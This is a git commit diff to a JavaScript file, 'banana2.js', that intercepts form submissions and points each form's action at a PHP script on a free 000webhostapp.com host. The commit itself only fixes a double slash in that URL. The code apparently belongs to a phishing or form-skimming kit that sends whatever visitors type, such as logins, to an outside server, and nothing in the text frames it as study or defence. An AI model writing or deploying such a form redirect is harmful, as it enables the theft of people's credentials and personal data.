39aebac5761c8b22336c820bfe758420fcef24ac
configure-compact-referal-atempt <154598749+configure-compact-referal-atempt@users.noreply.github.com>
2023-12-22 18:36:52 +0700

    Update banana2.js

--- koncolodon/cupboard/banana2.js
+++ koncolodon/cupboard/banana2.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://newyears-duaribuduaempat-go.000webhostapp.com/reguler//jure.php");
+  $(myform).attr("action", "https://newyears-duaribuduaempat-go.000webhostapp.com/reguler/jure.php");
 });
